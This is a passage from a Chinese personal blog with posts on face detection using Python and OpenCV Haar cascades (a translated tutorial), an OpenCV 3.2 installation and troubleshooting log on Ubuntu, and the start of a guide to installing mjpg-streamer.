<p>返回值告诉我们是否所有帧都读取完，当我们读取视频文件时会有这种情况。当我们从摄像头读取就不用管这个了，因为我们可以一直记录，所以我们可以忽略这个。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"># Capture frame-by-frame</div><div class="line">ret, frame = video_capture.read()</div><div class="line"></div><div class="line">gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)</div><div class="line"></div><div class="line">faces = faceCascade.detectMultiScale(</div><div class="line">    gray,</div><div class="line">    scaleFactor=1.1,</div><div class="line">    minNeighbors=5,</div><div class="line">    minSize=(30, 30),</div><div class="line">    flags=cv2.cv.CV_HAAR_SCALE_IMAGE</div><div class="line">)</div><div class="line"></div><div class="line"># Draw a rectangle around the faces</div><div class="line">for (x, y, w, h) in faces:</div><div class="line">    cv2.rectangle(frame, (x, y), (x+w, y+h), (0, 255, 0), 2)</div><div class="line"></div><div class="line"># Display the resulting frame</div><div class="line">cv2.imshow(&apos;Video&apos;, frame)</div></pre></td></tr></table></figure></p>
<p>又是这个，这些代码应该很熟悉。我们只是从我们的捕获帧中搜索人脸。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if cv2.waitKey(1) &amp; 0xFF == ord(&apos;q&apos;):</div><div class="line">    break</div></pre></td></tr></table></figure></p>
<p>我们等待’q’按键被按下。如果按下，我们就会退出这个脚本。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># When everything is done, release the capture</div><div class="line">video_capture.release()</div><div class="line">cv2.destroyAllWindows()</div></pre></td></tr></table></figure></p>
<p>这些只是在清理残留的东西。</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>！！！视频请查看原网站<br>所以，手里拿着驾驶证的是我。你可以看到，算法跟踪真实的我和照片上的我。注意当我慢慢移动，算法能跟上。当我更快一点移动我的手到我的脸上时，然而，它开始混乱，错把我的手腕当成脸。</p>
<p>就像我在文章最后说的一样，基于机器学习的算法，很少能达到100%的准确率。我们不是在那个，机械战警驾驶它的摩托车以时速100英里，使用低质量的闭路电视摄像机也能追踪到罪犯的阶段…还没到那个阶段。</p>
<p>代码一帧一帧地搜索脸部，所以这将会耗费相当多的处理能力。<br>举个例子，在我5年的旧笔记本上，这几乎消耗了90%的CPU。</p>
<h1 id="下一步"><a href="#下一步" class="headerlink" title="下一步"></a>下一步</h1><p>好的，所以你知道了如何检测人脸。但如果你想检测你自己的某个物体该怎么办，比如你的车、电视或你最喜欢的玩具。<br>OpenCV允许你创建自己的级联，但这个过程没有很好的记录。这是一个<a href="http://coding-robin.de/2013/07/22/train-your-own-opencv-haar-classifier.html" target="_blank" rel="external">博客文章</a>，告诉你怎么训练自己的级联来检测香蕉。</p>
<p>如果你想更进一步，识别具体的脸–或许是在众多陌生人之中检测且识别出你的脸–这是非常困难的任务。主要是由于需要有大量的图像预处理。但是如果你想应对这个挑战，用机器学习算法还是有可能的，<a href="http://scikit-learn.sourceforge.net/0.6/auto_examples/applications/plot_face_recognition.html" target="_blank" rel="external">这里</a>有介绍。</p>
<hr>
<h2 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h2><p>user@ubuntu:~/Webcam-Face-Detect$ python webcam_cv3.py haarcascade_frontalface_default.xml<br>Corrupt JPEG data: 1 extraneous bytes before marker 0xd4<br>Corrupt JPEG data: 12 extraneous bytes before marker 0xd5<br>……..<br><img src="/img/opencv-4.png" alt="opencv"><br><img src="/img/opencv-5.png" alt="opencv"></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="https://ly-nina.github.io/2017/03/25/25行python代码实现人脸识别/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="nina">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="nina's blog">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="nina's blog" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/03/25/25行python代码实现人脸识别/" itemprop="url">
                  25行python代码实现人脸识别
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-03-25T15:46:43+08:00">
                2017-03-25
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="25行python代码实现人脸识别"><a href="#25行python代码实现人脸识别" class="headerlink" title="25行python代码实现人脸识别"></a>25行python代码实现人脸识别</h1><p>翻译自:<br><a href="https://realpython.com/blog/python/face-recognition-with-python/" target="_blank" rel="external">https://realpython.com/blog/python/face-recognition-with-python/</a></p>
<p>译者：nina</p>
<hr>
<p>在这篇文章我们将会看到一个神奇又简单的方式来开始使用Python和开源库OpenCV进行人脸识别</p>
<pre><code>在你在评论区提任何问题前：
    1.不要忽略这篇文章就尝试运行代码.你一定要理解代码不仅正确的运行也要对它进行故障排除.
    2.确保你使用的是OpenCV v2.
    3.你需要一个正常工作的摄像头来正确地运行这些脚本.
    4.看看别人的评论或问题,可能你的问题已经解决.
</code></pre><h2 id="OpenCV"><a href="#OpenCV" class="headerlink" title="OpenCV"></a>OpenCV</h2><p>OpenCV是计算机视觉最流行的库,起初是用C/C++写的,现在支持Python.</p>
<p>OpenCV使用机器学习算法在一张图片里搜索人脸。对于一些和人脸一样复杂的东西,没有一个简单的测试会告诉你有没有发现人脸.相反,有数千种小的模式/特征会被匹配.这个算法打破了识别人脸的工作,甚至是成千上万的更小的,比特级别的任务,每一个都很容易解决.这些工作也被称为分类器。</p>
<p>对于一些像人脸一样的东西,你可能有6000甚至更多的分类器,所有这些一定会匹配一个被检测到的脸部(当然,在误差范围内).但问题在于:对于人脸检测,这个算法是从图片的左上方开始并且通过一个一个小的数据块向下移动,对每一个数据块,都不断地问”这是一张脸吗?…这是一张脸吗?…这是一张脸吗?”对每一块做6000甚至更多的测试之后,你可能有数以百万的计算需要做,这有可能让你的计算机运算到停止。</p>
<p>为了解决这个,OpenCV使用级联方式.什么是级联?最好的答案可以在字典中找到:一个瀑布或者是一系列瀑布.</p>
<p>好比一系列的瀑布,OpenCV级联分为多阶段来检测人脸,突破性地解决了这个问题.对于每一个块,会先进行粗糙快速的测试.如果通过,会进行更细微详细的测试等等.算法可能有30-50个阶段或级联,如果全部阶段通过,这只会检测出一张脸.这个算法的优点是大部分的图片在前几个阶段就会返回否定的结果,这意味着这个算法不会浪费时间来测试所有的6000个特征.人脸检测现在可以实时处理完成,而不是好几个小时.</p>
<h2 id="级联训练"><a href="#级联训练" class="headerlink" title="级联训练"></a>级联训练</h2><p>尽管理论可能听起来很复杂,但训练它非常简单.级联本身只是一堆包含OpenCV数据用于检测物体的XML文件.使用你想要的级联来初始化的你代码,然后它就会为你工作.</p>
<p>自从人脸检测很常见之后,OpenCV带有一些内置的级联来检测从脸到眼睛到手和脚的一切.甚至还有一些用于非人类的级联.例如.如果你开着一家香蕉店并且想跟踪偷香蕉的人,这个东西会为你建立此用途的级联.</p>
<h2 id="安装OpenCV"><a href="#安装OpenCV" class="headerlink" title="安装OpenCV"></a>安装OpenCV</h2><p>首先,你需要找到用于你的操作系统的正确的设置文件.</p>
<p>我发现安装OpenCV是最难的一部分.如果你碰到奇怪的无法解释的错误,可能是由于库冲突,32/64位的差异等.我找到一个最简单的方法,在Linux虚拟机里从零开始安装OpenCV.</p>
<p>一旦安装完成,你可以测试是否能工作,通过启动Python会话并输入:<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ python</div><div class="line">&gt;&gt;&gt; import cv2</div><div class="line">&gt;&gt;&gt;</div></pre></td></tr></table></figure></p>
<p>如果你没有碰到任何错误,你可以继续下一部分.</p>
<h2 id="理解代码"><a href="#理解代码" class="headerlink" title="理解代码"></a>理解代码</h2><p>让我们分解实际代码,你可以在<a href="https://github.com/shantnu/FaceDetect/" target="_blank" rel="external">repo</a>中下载.face_detect.py脚本,abba.png图片和haarcascade_frontalface_default.xml.<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># 得到用户提供的值</div><div class="line">imagePath = sys.argv[1]</div><div class="line">cascPath = sys.argv[2]</div></pre></td></tr></table></figure></p>
<p>你首先将图像和级联名称作为命令行参数传递进去.我们将会用Abba图像以及OpenCV提供的检测人脸的默认级联.<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># 创建一个haar级联</div><div class="line">faceCascade = cv2CascadeClassifier(cascPath)</div></pre></td></tr></table></figure></p>
<p>现在我们创建了级联并且初始化成人脸的级联.这会把人脸的级联装载到存储器所以可以开始使用它了.记住,这个级联只是一个XML文件,包含用于检测人脸的数据。<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># 读取图像</div><div class="line">image = cv2.imread(imagePath)</div><div class="line">gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)</div></pre></td></tr></table></figure></p>
<p>在这里我们读取了图像并转化为灰度图.OpenCV的许多操作都是在灰度图的基础上完成的.<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># 检测图像上的人脸</div><div class="line">faces = faceCascade.detectMultiScale(</div><div class="line">	gray,</div><div class="line">	scaleFactor=1.1,</div><div class="line">	minNeighbors=5,</div><div class="line">	minSize=(30, 30),</div><div class="line">	flags = cv2.cv.CV_HAAR_SCALE_IMAGE</div><div class="line">)</div></pre></td></tr></table></figure></p>
<p>这个函数检测出真实的脸-这是代码的关键,所以让我们来看看选项:<br>    1.detectMultiScale 函数是一个检测物体的普通函数.当我们调用它为人脸的级联,他就检测人脸.第一个选项是灰度图.<br>    2.第二个是scaleFactor.因为一些人脸可能会靠摄像机很近,他们的脸会比更后面的人大.这是比例因子补偿.<br>    3.这个检测算法采用移动窗口来检测目标.minNeighbors 定义了在宣布人脸被找到之前,当前窗口附近有多少目标被检测到.minSize,同时定义了每一个窗口大小</p>
<pre><code>我使用的是这些字段的常用值.在实际生活中,你会尝试不用值的窗口大小,比例因子,等等.直到你找到一个对你最有用的值.
</code></pre><p>这个函数会返回一个矩形列表,在它认为是脸的地方.然后,我们可以圈出它认为找到的地方.<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">print &quot;Found &#123;0&#125; faces!&quot;.format(len(faces))</div><div class="line"></div><div class="line"># 在脸周围画出矩形边框</div><div class="line">for (x, y, w, h) in faces:</div><div class="line">	cv2.rectangle(image, (x, y), (x+w, y+h), (0, 255, 0),2)</div></pre></td></tr></table></figure></p>
<p>这个函数返回4个值:矩形的x和y位置,和矩形的宽高(w, h).<br>我们用这些值来画出矩形,通过内置的rectangle()函数.<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cv2.imshow(&quot;Faces found&quot;, image)</div><div class="line">cv2.waitKey(0)</div></pre></td></tr></table></figure></p>
<p>最后,我们显示图像,并等待用户按下一个键为止.</p>
<h2 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果"></a>验证结果</h2><p>验证Abba图片:<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ python face_detect.py abba.png haarcascade_frontalface_default.xml</div></pre></td></tr></table></figure></p>
<p><img src="/img/opencv-3.png" alt="opencv"></p>
<h2 id="摄像头扩展"><a href="#摄像头扩展" class="headerlink" title="摄像头扩展"></a>摄像头扩展</h2><p>如果你想使用摄像头该怎么办?OpenCV从摄像头抓取每一帧,然后你可以通过处理每一帧来检测人脸.你需要一台强大的计算机,即使我已经用了5年的笔记本看起来应该没问题,只要不乱搞.</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="https://ly-nina.github.io/2017/03/19/opencv安装过程及错误解决办法/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="nina">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="nina's blog">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="nina's blog" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/03/19/opencv安装过程及错误解决办法/" itemprop="url">
                  opencv安装过程及错误解决办法
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-03-19T15:59:33+08:00">
                2017-03-19
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="opencv安装过程及错误解决办法"><a href="#opencv安装过程及错误解决办法" class="headerlink" title="opencv安装过程及错误解决办法"></a>opencv安装过程及错误解决办法</h2><p>Ubuntu 16.04<br>Cmake 3.5.1<br>opencv 3.2.0</p>
<p>先准备好opencv、cmake、cmake-qt-gui<br>参考：<a href="http://blog.csdn.net/u011783201/article/details/52086560" target="_blank" rel="external">http://blog.csdn.net/u011783201/article/details/52086560</a><br>opencv：<br><a href="http://www.opencv.org.cn/index.php/Download" target="_blank" rel="external">http://www.opencv.org.cn/index.php/Download</a><br><a href="http://opencv.org/downloads.html" target="_blank" rel="external">http://opencv.org/downloads.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># sudo apt-get install cmake cmake-qt-gui</div><div class="line"># sudo apt-get install libgtk2.0-dev</div><div class="line"># sudo apt-get install pkg-config</div></pre></td></tr></table></figure></p>
<p>解压opencv、再新建一个opencv_build文件夹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># sudo cmake-gui</div></pre></td></tr></table></figure></p>
<p>source code 选择opencv文件夹<br>build the binaries 选择新建的build文件夹</p>
<p>点击configurate，会卡在ippicv下载阶段：</p>
<p>解决办法一：</p>
<p>把3rdparty里的ippicv文件夹删除，然后在cmake-gui点击configurate<br>还是会出错，但不会卡在那(卡在那是因为程序想下载，但又下载不下来，就一直卡在这里，卡很久之后才会提示错误)。不用管，直接点击generate(注意要把WITH_IPP的勾取消，否则后面编译会出错)，显示完成。</p>
<p>解决办法二：<br><a href="http://blog.csdn.net/carson2005/article/details/46381351" target="_blank" rel="external">http://blog.csdn.net/carson2005/article/details/46381351</a><br>找到ippv的linux版本，替换那个压缩文件之后再configurate<br>这里也要把WITH_IPP取消。<br>(这个办法不确定能不能行得通。因为我开着两个虚拟机试的，这个办法是在Ubuntu12.04上，配置、生成的时候没有问题，但是在后面build文件夹  make 的时候会报错，原因是ippicv，但我已经把IPP的勾点掉了的，不知道为什么还会提示这个。网上找的也说勾点掉就可以。试了好几次都这样，我就放弃了，毕竟在16.04已经可以用了，就不纠结了0.0.继续往下看….)</p>
<p>====================================================<br>然后直接去试试example(在opencv-3.2.0/sample/cpp/example_cmake)，返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Could not find a package configuration file provided by &quot;OpenCV&quot; with any</div><div class="line">of the following names:</div><div class="line"></div><div class="line">  OpenCVConfig.cmake</div><div class="line">  opencv-config.cmake</div><div class="line"></div><div class="line">Add the installation prefix of &quot;OpenCV&quot; to CMAKE_PREFIX_PATH or set</div><div class="line">&quot;OpenCV_DIR&quot; to a directory containing one of the above files.  If &quot;OpenCV&quot;</div><div class="line">provides a separate development package or SDK, be sure it has been</div><div class="line">installed.</div></pre></td></tr></table></figure></p>
<p>一直以为是安装出问题，又重装好几遍还是一样，然后又去找文件设置路径。。。后面在<a href="http://stackoverflow.com/questions/27127153/cmake-error-at-cmakelists-txt-cmake-prefix-path" target="_blank" rel="external">stackoverflow</a>看到，<br>要配置OpenCVConfig.cmake的路径，<br>先搜索这个文件，发现是在build目录下<br>根据上面的错误，需要指定 OpenCV_DIR 路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># sudo cmake -DOpenCV_DIR=&quot;/home/user/opencv-3.2_build/&quot;</div></pre></td></tr></table></figure></p>
<p>返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-- OpenCV library status:</div><div class="line">--     version: 3.2.0</div><div class="line">--     libraries: opencv_calib3d;opencv_core;opencv_features2d;opencv_flann;opencv_highgui;opencv_imgcodecs;opencv_imgproc;opencv_ml;opencv_objdetect;opencv_photo;opencv_shape;opencv_stitching;opencv_superres;opencv_video;opencv_videoio;opencv_videostab</div><div class="line">--     include path: /home/user/opencv-3.2_build;/home/user/opencv-3.2.0/include;/home/user/opencv-3.2.0/include/opencv;/home/user/opencv-3.2.0/modules/core/include;/home/user/opencv-3.2.0/modules/flann/include;/home/user/opencv-3.2.0/modules/imgproc/include;/home/user/opencv-3.2.0/modules/ml/include;/home/user/opencv-3.2.0/modules/photo/include;/home/user/opencv-3.2.0/modules/video/include;/home/user/opencv-3.2.0/modules/imgcodecs/include;/home/user/opencv-3.2.0/modules/shape/include;/home/user/opencv-3.2.0/modules/videoio/include;/home/user/opencv-3.2.0/modules/highgui/include;/home/user/opencv-3.2.0/modules/objdetect/include;/home/user/opencv-3.2.0/modules/superres/include;/home/user/opencv-3.2.0/modules/ts/include;/home/user/opencv-3.2.0/modules/features2d/include;/home/user/opencv-3.2.0/modules/calib3d/include;/home/user/opencv-3.2.0/modules/stitching/include;/home/user/opencv-3.2.0/modules/videostab/include</div><div class="line">-- Configuring done</div><div class="line">-- Generating done</div><div class="line">-- Build files have been written to: /home/user/opencv-3.2.0/samples/cpp/example_cmake</div></pre></td></tr></table></figure></p>
<p>说明对当前所在文件夹编译了，现在应该能用了吧。。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"># sudo cmake . //对当前文件夹编译,有个空格</div><div class="line"># sudo make</div><div class="line"></div><div class="line">Scanning dependencies of target opencv_example</div><div class="line">[ 50%] Building CXX object CMakeFiles/opencv_example.dir/example.cpp.o</div><div class="line">make[2]: *** No rule to make target &apos;/home/user/opencv-3.2_build/lib/libopencv_shape.so.3.2.0&apos;, needed by &apos;opencv_example&apos;.  Stop.</div><div class="line">CMakeFiles/Makefile2:67: recipe for target &apos;CMakeFiles/opencv_example.dir/all&apos; failed</div><div class="line">make[1]: *** [CMakeFiles/opencv_example.dir/all] Error 2</div><div class="line">Makefile:83: recipe for target &apos;all&apos; failed</div><div class="line">make: *** [all] Error 2</div></pre></td></tr></table></figure></p>
<p>忘记了一件最重要的事！！！没有进build文件夹执行make和make install！之前好几次不能运行给搞懵了 = =.<br>所以提示没有.so文件</p>
<hr>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># cd /home/user/opencv_build</div><div class="line"># make</div><div class="line"># make install</div></pre></td></tr></table></figure>
<p>结束之后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># cd /home/user/opencv-3.2.0/samples/cpp/example_cmake</div><div class="line"># sudo cmake .</div><div class="line"># sudo make </div><div class="line">[ 50%] Linking CXX executable opencv_example</div><div class="line">[100%] Built target opencv_example</div><div class="line">./opencv_example</div></pre></td></tr></table></figure></p>
<p><img src="/img/opencv-1.png" alt="opencv"></p>
<p>测试例子——–<br>官网看到的测试代码<br>在桌面新建文件夹  DisplayImage<br>里面新建两个文件：DisplayImage.cpp<br>                  CMakeLists.txt<br>DisplayImage.cpp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;opencv2/opencv.hpp&gt;</div><div class="line"></div><div class="line">using namespace cv;</div><div class="line"></div><div class="line">int main(int argc, char** argv )</div><div class="line">&#123;</div><div class="line">    if ( argc != 2 )</div><div class="line">    &#123;</div><div class="line">        printf(&quot;usage: DisplayImage.out &lt;Image_Path&gt;\n&quot;);</div><div class="line">        return -1;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    Mat image;</div><div class="line">    image = imread( argv[1], 1 );</div><div class="line"></div><div class="line">    if ( !image.data )</div><div class="line">    &#123;</div><div class="line">        printf(&quot;No image data \n&quot;);</div><div class="line">        return -1;</div><div class="line">    &#125;</div><div class="line">    namedWindow(&quot;Display Image&quot;, WINDOW_AUTOSIZE );</div><div class="line">    imshow(&quot;Display Image&quot;, image);</div><div class="line"></div><div class="line">    waitKey(0);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>CMakeLists.txt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">cmake_minimum_required(VERSION 2.8)</div><div class="line">project( DisplayImage )</div><div class="line">find_package( OpenCV REQUIRED )</div><div class="line">include_directories( $&#123;OpenCV_INCLUDE_DIRS&#125; )</div><div class="line">add_executable( DisplayImage DisplayImage.cpp )</div><div class="line">target_link_libraries( DisplayImage $&#123;OpenCV_LIBS&#125; )</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># sudo cmake .</div><div class="line"># sudo make </div><div class="line"># ./DisplayImage test.jpg  //要传入图片。根据代码意思，只是打开一张图片</div></pre></td></tr></table></figure>
<p><img src="/img/opencv-2.png" alt="opencv"></p>
<p>参考链接：<br><a href="http://blog.csdn.net/u011783201/article/details/52086560" target="_blank" rel="external">http://blog.csdn.net/u011783201/article/details/52086560</a><br><a href="http://www.opencv.org.cn/index.php/Download" target="_blank" rel="external">http://www.opencv.org.cn/index.php/Download</a><br><a href="http://opencv.org/downloads.html" target="_blank" rel="external">http://opencv.org/downloads.html</a><br><a href="http://blog.csdn.net/carson2005/article/details/46381351" target="_blank" rel="external">http://blog.csdn.net/carson2005/article/details/46381351</a><br><a href="http://stackoverflow.com/questions/27127153/cmake-error-at-cmakelists-txt-cmake-prefix-path" target="_blank" rel="external">http://stackoverflow.com/questions/27127153/cmake-error-at-cmakelists-txt-cmake-prefix-path</a><br><a href="http://docs.opencv.org/3.0-last-rst/doc/tutorials/introduction/linux_gcc_cmake/linux_gcc_cmake.html" target="_blank" rel="external">http://docs.opencv.org/3.0-last-rst/doc/tutorials/introduction/linux_gcc_cmake/linux_gcc_cmake.html</a><br><a href="https://yq.aliyun.com/articles/63300" target="_blank" rel="external">https://yq.aliyun.com/articles/63300</a></p>
<font color="red" size="5">Mail:605971081@qq.com</font>
          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="https://ly-nina.github.io/2017/03/13/记mjpg-streamr的安装和使用/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="nina">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="nina's blog">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="nina's blog" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/03/13/记mjpg-streamr的安装和使用/" itemprop="url">
                  记mjpg-streamr的安装和使用
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-03-13T23:00:21+08:00">
                2017-03-13
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="记mjpg-streamr的安装和使用以及黑屏问题"><a href="#记mjpg-streamr的安装和使用以及黑屏问题" class="headerlink" title="记mjpg-streamr的安装和使用以及黑屏问题"></a>记mjpg-streamr的安装和使用以及黑屏问题</h2><p>环境：VMware  Ubuntu16.04   摄像头为USB外接摄像头，支持UVC<br>经测试，笔记本自带摄像头也可以使用</p>
<p>先安装必要的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install libsdl1.2-dev subversion libjpeg-dev libjpeg62-dev imagemagick</div><div class="line">git clone https://github.com/shrkey/mjpg-streamer  //如果没有安装git，要先 sudo apt install git</div><div class="line">cd mjpg-streamer/mjpg-streamer</div><div class="line">make clean</div><div class="line">make </div><div class="line">sudo make install</div></pre></td></tr></table></figure></p>
<p>编译完成后，测试是否能使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">export LD_LIBRARY_PATH=.</div><div class="line">./mjpg_streamer -i &quot;input_uvc.so -d /dev/video0 -y -r 960x720&quot; -o &quot;output_http.so -w ./www&quot;</div></pre></td></tr></table></figure></p>
<p>浏览器打开调试页面<br>127.0.0.1:8080</p>
